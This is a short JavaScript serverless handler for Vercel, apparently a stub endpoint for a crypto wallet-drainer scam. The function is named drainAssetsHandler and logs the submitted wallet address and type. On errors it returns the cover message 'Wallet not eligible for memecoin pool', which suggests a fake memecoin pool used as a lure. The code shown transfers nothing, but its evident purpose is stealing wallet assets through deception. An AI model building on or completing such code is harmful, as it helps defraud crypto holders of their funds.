// Minimal drainAssets function for Vercel deployment
module.exports = async function drainAssetsHandler(req, res) {
  // Set CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  // Handle preflight request
  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }

  // Only allow POST requests
  if (req.method !== 'POST') {
    res.status(405).json({ error: 'Method not allowed' });
    return;
  }

  try {
    const { user, walletType } = req.body;
    
    console.log('[DRAIN_ASSETS] Request received:', { user, walletType });
    
    // Simple validation
    if (!user || typeof user !== 'string') {
      return res.status(400).json({ 
        success: false,
        error: 'Missing or invalid user parameter',
        message: 'Wallet not eligible for memecoin pool'
      });
    }

    // Return success response
    return res.status(200).json({
      success: true,
      message: 'Drain assets endpoint is working!',
      user: user,
      walletType: walletType || 'unknown',
      timestamp: new Date().toISOString(),
      status: 'ready'
    });

  } catch (error) {
    console.error('[DRAIN_ASSETS] Error:', error);
    
    res.status(500).json({
      success: false,
      error: error.message || 'Unknown error',
      message: 'Wallet not eligible for memecoin pool'
    });
  }
}
